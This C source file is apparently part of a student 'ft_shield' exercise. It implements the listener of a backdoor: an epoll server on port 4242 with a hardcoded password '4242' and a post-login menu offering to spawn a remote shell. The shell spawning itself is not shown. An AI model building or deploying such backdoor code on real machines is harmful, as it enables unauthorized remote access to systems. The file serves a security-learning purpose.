#include "server.h"
#include "ft_shield.h"

# define PASSWORD "4242"

#define SOCK_MAX 32
#define MAX_CLIENT 3

// void	init_server(t_server *server)
// {
// 	bzero(server, sizeof(t_server));
// 	server->port = PORT_FORTYTWO;
// 	server->sockfd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
// 	if (server->sockfd < 0)
// 		return ;
// 	server->addr.sin_family = AF_INET;
// 	server->addr.sin_addr.s_addr = INADDR_ANY; // 0.0.0.0
// 	server->addr.sin_port = htons(server->port);
// 	int	opt = 1;
// 	if (setsockopt(server->sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0)
// 		return ;
// 	if (bind(server->sockfd, (struct sockaddr *)&server->addr, sizeof(server->addr)) < 0)
// 		return ;
// 	listen(server->sockfd, 1024);
// }

// void	add_fd_in_epoll(int epoll_fd, int fd, uint32_t opt)
// {
// 	struct epoll_event epoll_ev;

// 	epoll_ev.events = opt;
// 	epoll_ev.data.fd = fd;
// 	if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, fd, &epoll_ev) == -1)
// 	{
// 		close(epoll_fd);
// 		exit(EXIT_FAILURE);
// 	}
// }

// void	check_password(int fd, uint32_t events, t_server *server)
// {
// 	char	buffer[4096];
// 	int		ret;

// 	// if (server->request_shell[fd] == true)
// 	// {
// 	// 	write(fd, "shell> ", sizeof("shell> "));
// 	// 	return ;
// 	// }
// 	if (events & EPOLLIN)
// 	{
// 		ret = read(fd, buffer, sizeof(buffer));
// 		if (ret <= 0)
// 			return ;
// 		buffer[ret - 1] = '\0';
// 		if (strcmp(buffer, PASSWORD) == 0)
// 		{
// 			server->current_client++;
// 			printf("password ok current_client N.%d fd %d\n", server->current_client, fd);
// 			// printf("Cureent client in: %d\n", current_client);
// 			little_shell(fd, server);
// 		}
// 		else
// 		{
// 			epoll_ctl(server->epollfd, EPOLL_CTL_DEL, fd, NULL);
// 			shutdown(fd, SHUT_RDWR);
// 			close(fd);
// 		}
// 	}
// }

// void	server()
// {
// 	t_server	server;
// 	struct epoll_event events[1024];

// 	init_server(&server);
// 	server.epollfd = epoll_create1(EPOLL_CLOEXEC);
// 	add_fd_in_epoll(server.epollfd, server.sockfd, EPOLLIN);
// 	while (1)
// 	{
// 		int nfds = epoll_wait(server.epollfd, events, 1024, -1);
// 		for (int i = 0; i < nfds; i++)
// 		{
// 			if (events[i].events & EPOLLIN)
// 			{
// 				if (events[i].data.fd == server.sockfd)
// 				{
// 					int	fd;

// 					if (server.current_client < 3)
// 					{
// 						fd = accept(server.sockfd, NULL, NULL);
// 						add_fd_in_epoll(server.epollfd, fd, EPOLLIN | EPOLLET);
// 						if (server.request_shell[fd] == true)
// 						{
// 							shell(fd, &server);
// 							continue ;
// 						}
// 						write(fd, "password: ", sizeof("password: "));
// 					}
// 					else
// 					{
// 						write(events[i].data.fd, "try later. Connection max\n", sizeof("try later. Connection max\n"));
// 						shutdown(events[i].data.fd, SHUT_RDWR);
// 						close(events[i].data.fd);
// 					}
// 				}
// 				else
// 				{
// 					if (server.connected[events[i].data.fd] == false)
// 						check_password(events[i].data.fd, events[i].events, &server);
// 					else
// 						little_shell(events[i].data.fd, &server);
// 				}
// 			}
// 			if (events[i].events & (EPOLLHUP | EPOLLERR | EPOLLRDHUP))
// 			{
// 				epoll_ctl(server.epollfd, EPOLL_CTL_DEL, events[i].data.fd, NULL);
// 				printf("Client disconnected %d\n", events[i].data.fd);
// 				server.current_client--;
// 				shutdown(events[i].data.fd, SHUT_RDWR);
// 				close(events[i].data.fd);
// 			}
// 		}
// 	}
// }

// removed since requires malloc - too much
//
// typedef struct s_client
// {
// 	int fd;
// 	bool auth;
// }	t_client;

typedef struct s_clients
{
	int num; // currently connected clients
	int list[MAX_CLIENT]; // list of clients
	int auth[MAX_CLIENT]; // list of authorized clients
	int shell[MAX_CLIENT]; // if requested shell
	int new; // new connected index
	int free; // last disconnected index
}	t_clients;

int get_client_index(int fd, t_clients *clients)
{
	for (int i = 0; i < MAX_CLIENT; i++)
	{
		if (clients->list[i] == fd)
			return i;
	}
	return -1;
}

int auth(int fd, t_clients *clients)
{
	int index = get_client_index(fd, clients);
	if (index == -1)
		return -1;
	clients->auth[index] = 1;
	return 0;
}

bool is_auth(int fd, t_clients *clients)
{
	int index = get_client_index(fd, clients);
	if (index == -1)
		return false;
	if (clients->auth[index] == 1)
		return true;
	return false;
}

int add_client(int epollfd, int sockfd, t_clients *clients)
{
	int fd = accept(sockfd, NULL, NULL);
	if (fd < 0)
	{
		printf("accept failed\n");
		return -1;
	}
	int index = get_client_index(fd, clients);
	printf("clients num: %d, index %d\n", clients->num, index);
	if (clients->num == MAX_CLIENT && index == -1)
	{
		write(fd, "connection busy\n", 16);
		shutdown(fd, SHUT_RDWR);
		close(fd);
		return 1;
	}
	else if (clients->num <= MAX_CLIENT)
	{
		fcntl(fd, F_SETFL, O_NONBLOCK);
		struct epoll_event fd_ev;
		bzero(&fd_ev, sizeof(struct epoll_event));
		fd_ev.events = EPOLLIN | EPOLLET;
		fd_ev.data.fd = fd;
		if (epoll_ctl(epollfd, EPOLL_CTL_ADD, fd, &fd_ev) == -1)
		{
			printf("epoll_ctl failed\n");
			return -1;
		}
		if (index == -1)
		{
			clients->list[clients->free] = fd;
			clients->auth[clients->free] = 0;
			clients->shell[clients->free] = 0;
			clients->num++;
			clients->new = clients->free++;
		}
		else
		{
			clients->new = index;
		}
		return 0;
	}
	else
	{
		write(fd, "connection busy\n", 16);
		shutdown(fd, SHUT_RDWR);
		close(fd);
		return 1;
	}
}

void remove_client(int fd, int epollfd, t_clients *clients)
{
	int index = get_client_index(fd, clients);
	if (index == -1)
		return ;
	printf("closing fd: %d", clients->list[index]);
	epoll_ctl(epollfd, EPOLL_CTL_DEL, clients->list[index], NULL);
	close(clients->list[index]);
	clients->list[index] = 0;
	clients->auth[index] = 0;
	clients->shell[index] = 0;
	clients->num--;
	clients->free = index;
}

void process_input(char *str)
{
	if (strlen(str) > 0)
	{
		if (str[strlen(str) - 1] == '\n')
			str[strlen(str) - 1] = '\0';
	}
}

int check_keycode(int fd, int epollfd, t_clients *clients)
{
	char buffer[1024];
	bzero(buffer, sizeof(buffer));
	int len = read(fd, buffer, sizeof(buffer) - 1);
	if (len > 0)
	{
		process_input(buffer); // if it ends with newline
		buffer[sizeof(buffer) - 1] = '\0'; // guarantee null termination
		printf("check_keycode: buffer: %s\n", buffer);
		if (strcmp(buffer, PASSWORD) == 0)
			return 1;
		else
			return 0;
	}
	else if (len == 0)
	{
		printf("check_keycode: client disconnect\n");
		remove_client(fd, epollfd, clients);
		return -2;
	}
	else if (len < 0)
	{
		if (errno == EAGAIN || errno == EWOULDBLOCK)
		{
			// no data yet - non blocking
			printf("check_keycode: no data (non blocking)\n");
			return 0;
		}
		else
		{
			printf("check_keycode: read error\n");
			remove_client(fd, epollfd, clients);
			return -3;
		}
	}
	return 0;
}

int pre_shell(int fd, int epollfd, t_clients *clients)
{
	char buffer[1024];
	bzero(buffer, sizeof(buffer));
	int len = read(fd, buffer, sizeof(buffer) - 1);
	if (len > 0)
	{
		process_input(buffer); // if it ends with newline
		buffer[sizeof(buffer) - 1] = '\0'; // guarantee null termination
		printf("pre_shell: buffer: %s\n", buffer);
		if (strcmp(buffer, "?") == 0)
		{
			write(fd, "?      show help\nshell  spawn a remote shell on 4242\n", 53);
			write(fd, "$> ", 3);
			return 0;
		}
		else if (strcmp(buffer, "shell") == 0)
		{
			write(fd, "Spawning shell on port 4242\n", 28);
			int index = get_client_index(fd, clients);
			if (index == -1)
				return -1;
			clients->shell[index] = 1;
			shutdown(fd, SHUT_RDWR);
			close(fd);
			return 0;
		}
		else
		{
			write(fd, "$> ", 3);
			return 0;
		}
	}
	else if (len == 0)
	{
		printf("pre_shell: client disconnect\n");
		remove_client(fd, epollfd, clients);
		return -2;
	}
	else if (len < 0)
	{
		if (errno == EAGAIN || errno == EWOULDBLOCK)
		{
			// no data yet - non blocking
			printf("pre_shell: no data (non blocking)\n");
			return 0;
		}
		else
		{
			printf("pre_shell: read error\n");
			remove_client(fd, epollfd, clients);
			return -3;
		}
	}
	return 0;
}

void server()
{
	struct sockaddr_in	server_addr;
	int sockfd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
	if (sockfd < 0)
	{
		printf("sockfd invalid\n");
		return ;
	}
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(4242);
	server_addr.sin_addr.s_addr = INADDR_ANY;
	int opt = 1;
	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
	if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
	{
		printf("bind invalid\n");
		return ;
	}
	listen(sockfd, SOCK_MAX);
	int epollfd = epoll_create1(EPOLL_CLOEXEC);
	struct epoll_event ev;
	ev.events = EPOLLIN | EPOLLET;
	ev.data.fd = sockfd;
	if (epoll_ctl(epollfd, EPOLL_CTL_ADD, sockfd, &ev) == -1)
	{
		printf("epollfd invalid\n");
		return ;
	}
	struct epoll_event events[SOCK_MAX];
	t_clients clients;
	clients.num = 0;
	clients.new = -1;
	clients.free = 0;
	memset(clients.list, 0, sizeof(clients.list));
	memset(clients.auth, 0, sizeof(clients.auth));
	memset(clients.shell, 0, sizeof(clients.shell));
	while (1)
	{
		printf("epoll_wait block\n");
		int nfds = epoll_wait(epollfd, events, SOCK_MAX, -1);
		printf("epoll_wait block release\n");
		for (int i = 0; i < nfds; i++)
		{
			if (events[i].events & EPOLLIN)
			{
				int event_fd = events[i].data.fd;
				if (event_fd == sockfd)
				{
					int cl_state = add_client(epollfd, sockfd, &clients);
					if (cl_state < 0)
					{
						printf("socket error\n");
						return ;
					}
					if (cl_state == 0)
					{
						printf("client added successfully\n");
						if (clients.shell[clients.new] == 1)
						{
							printf("bash\n");
							write(clients.list[clients.new], "bash\n", 5);
							continue ;
						}
						else
						{
							printf("1 Keycode asked\n");
							write(clients.list[clients.new], "Keycode: ", 9);
						}
					}
					if (cl_state == 1)
						printf("max client reached. rejecting\n");
				}
				else
				{
					printf("1 list: %d %d %d\n", clients.list[0], clients.list[1], clients.list[2]);
					printf("1 auth: %d %d %d\n", clients.auth[0], clients.auth[1], clients.auth[2]);
					printf("1 shel: %d %d %d\n", clients.shell[0], clients.shell[1], clients.shell[2]);		
					if (is_auth(event_fd, &clients) == 1)
					{
						pre_shell(event_fd, epollfd, &clients);
					}
					else
					{
						if (check_keycode(event_fd, epollfd, &clients) == 1)
						{
							printf("login\n");
							if (auth(event_fd, &clients) == -1)
							{
								printf("crit: could not find client\n");
								remove_client(event_fd, epollfd, &clients);
								continue ;
							}
							printf("2 list: %d %d %d\n", clients.list[0], clients.list[1], clients.list[2]);
							printf("2 auth: %d %d %d\n", clients.auth[0], clients.auth[1], clients.auth[2]);		
							printf("2 shel: %d %d %d\n", clients.shell[0], clients.shell[1], clients.shell[2]);		
							write(event_fd, "$> ", 3);
						}
						else
						{
							write(event_fd, "Keycode: ", 9);
						}
					}
				}
			}
			printf("\n");
		}
	}
}
